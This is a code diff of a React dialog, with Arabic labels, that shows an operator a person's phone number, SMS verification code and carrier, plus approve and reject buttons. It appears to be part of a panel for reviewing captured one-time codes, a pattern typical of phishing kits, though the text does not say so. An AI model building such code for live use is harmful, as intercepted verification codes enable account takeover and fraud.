@@ -4,31 +4,63 @@ import { useState } from "react";
 import {
   Dialog,
   DialogContent,
-  DialogDescription,
   DialogHeader,
   DialogTitle,
   DialogFooter,
 } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
-import { Phone } from "lucide-react";
-import { Badge } from "@/components/ui/badge";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Phone, Lock, Shield } from "lucide-react";
+import { toast } from "sonner";
 
 interface PhoneDialogProps {
   open: boolean;
   onOpenChange: (open: boolean) => void;
-  notification: any | null;
+  phone1?: string;
+  phoneOtp?: string;
+  notification: any;
+  operator?: string;
+  handleApproval: (state: string, id: string) => Promise<void>;
 }
 
 export function PhoneDialog({
   open,
   onOpenChange,
+  phone1,
+  phoneOtp,
+  operator,
   notification,
+  handleApproval,
 }: PhoneDialogProps) {
-  const [isLoading, setIsLoading] = useState(false);
+  const [phoneNumber, setPhoneNumber] = useState(phone1 || "");
+  const [otp, setOtp] = useState(phoneOtp || "");
+  const [operatorName, setOperatorName] = useState(operator || "");
+  const [requierdAttachment, setRequierdAttachment] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  if (!notification) {
-    return null;
-  }
+  const handleSave = async () => {
+    if (!open) return;
+
+    setIsSubmitting(true);
+    try {
+      // Since we don't have the notification ID here, we'll just show a success message
+      // In a real implementation, you would update the database
+      toast.success("تم حفظ بيانات الهاتف بنجاح", {
+        position: "top-center",
+        duration: 3000,
+      });
+      onOpenChange(false);
+    } catch (error) {
+      console.error("Error updating phone information:", error);
+      toast.error("حدث خطأ أثناء حفظ البيانات", {
+        position: "top-center",
+        duration: 3000,
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
@@ -38,78 +70,71 @@ export function PhoneDialog({
       >
         <DialogHeader className="border-b pb-3">
           <DialogTitle className="text-xl font-bold bg-gradient-to-r from-primary to-primary/80 text-transparent bg-clip-text">
-            معلومات الهاتف
+            بيانات الهاتف
           </DialogTitle>
-          <DialogDescription>
-            تفاصيل معلومات الهاتف ورمز التحقق
-          </DialogDescription>
         </DialogHeader>
 
         <div className="space-y-4 py-3">
-          <div className="p-5 rounded-lg bg-gradient-to-r from-blue-500 to-blue-600 text-white shadow-lg">
-            <div className="flex justify-between items-start mb-6">
+          <div className="p-4 rounded-lg bg-gradient-to-r from-purple-500 to-purple-600 text-white shadow-lg">
+            <div className="flex justify-between items-start mb-4">
               <div className="flex flex-col">
-                <span className="text-xs text-blue-100 mb-1">صاحب الهاتف</span>
+                <span className="text-sm text-purple-100 mb-1">
+                  معلومات الهاتف
+                </span>
                 <span className="font-medium">
-                  {notification.full_name ||
-                    notification.document_owner_full_name ||
-                    "غير محدد"}
+                  {notification?.phone || "غير محدد"}
                 </span>
               </div>
               <Phone className="h-8 w-8 text-white opacity-80" />
             </div>
-
-            <div className="mb-4">
-              <span className="text-xs text-blue-100 mb-1 block">
-                رقم الهاتف
-              </span>
-              <span className="font-mono text-lg tracking-wider" dir="ltr">
-                {notification.phone || notification.phone1 || "غير محدد"}
-              </span>
-            </div>
-
-            <div className="flex justify-between">
-              <div>
-                <span className="text-xs text-blue-100 block">
-                  شركة الاتصالات
-                </span>
-                <span className="font-mono">
-                  {notification.operator || "غير محدد"}
-                </span>
-              </div>
-              <div>
-                <span className="text-xs text-blue-100 block">رمز التحقق</span>
-                <span className="font-mono">
-                  {notification.phoneOtp || "غير محدد"}
-                </span>
-              </div>
-            </div>
           </div>
 
-          <div className="p-4 rounded-lg bg-gray-50 dark:bg-gray-700">
-            <h3 className="font-medium mb-2 text-sm">معلومات إضافية</h3>
-            <div className="space-y-2">
-              <div className="flex justify-between text-sm">
-                <span className="text-muted-foreground">الحالة:</span>
-                <Badge
-                  variant={
-                    notification.status === "approved"
-                      ? "default"
-                      : notification.status === "rejected"
-                      ? "secondary"
-                      : "outline"
-                  }
-                >
-                  {notification.status === "approved"
-                    ? "مقبول"
-                    : notification.status === "rejected"
-                    ? "مرفوض"
-                    : "قيد الانتظار"}
-                </Badge>
+          <div className="space-y-4">
+            <div className="grid gap-2">
+              <Label htmlFor="phone" className="text-right">
+                رقم الهاتف
+              </Label>
+              <div className="relative">
+                <Phone className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="otp"
+                  readOnly
+                  value={notification?.phone}
+                  className="pr-10"
+                  dir="ltr"
+                />
               </div>
-              <div className="flex justify-between text-sm">
-                <span className="text-muted-foreground">الصفحة الحالية:</span>
-                <span>{notification.pagename || "غير محدد"}</span>
+            </div>
+
+            <div className="grid gap-2">
+              <Label htmlFor="otp" className="text-right">
+                رمز التحقق
+              </Label>
+              <div className="relative">
+                <Lock className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="otp"
+                  readOnly
+                  value={notification?.phoneOtp}
+                  className="pr-10"
+                  dir="ltr"
+                />
+              </div>
+            </div>
+
+            <div className="grid gap-2">
+              <Label htmlFor="operator" className="text-right">
+                مشغل الشبكة
+              </Label>
+              <div className="relative">
+                <Shield className="absolute right-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                <Input
+                  id="otp"
+                  readOnly
+                  value={notification?.operator}
+                  className="pr-10"
+                  dir="ltr"
+                />
               </div>
             </div>
           </div>
@@ -117,11 +142,18 @@ export function PhoneDialog({
 
         <DialogFooter className="flex flex-col sm:flex-row gap-2 sm:gap-0 mt-4 pt-3 border-t">
           <Button
-            onClick={() => onOpenChange(false)}
-            className="w-full"
-            variant="outline"
+            onClick={() => handleApproval("approved", notification.id)}
+            disabled={isSubmitting}
+            className="w-full bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700 text-white border-0 shadow-md"
           >
-            إغلاق
+            {isSubmitting ? "جاري الحفظ..." : "قبول البيانات"}
+          </Button>
+          <Button
+            onClick={() => handleApproval("rejected", notification.id)}
+            disabled={isSubmitting}
+            className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-purple-700 text-white border-0 shadow-md"
+          >
+            {isSubmitting ? "جاري الحفظ..." : "رفض البيانات"}
           </Button>
         </DialogFooter>
       </DialogContent>
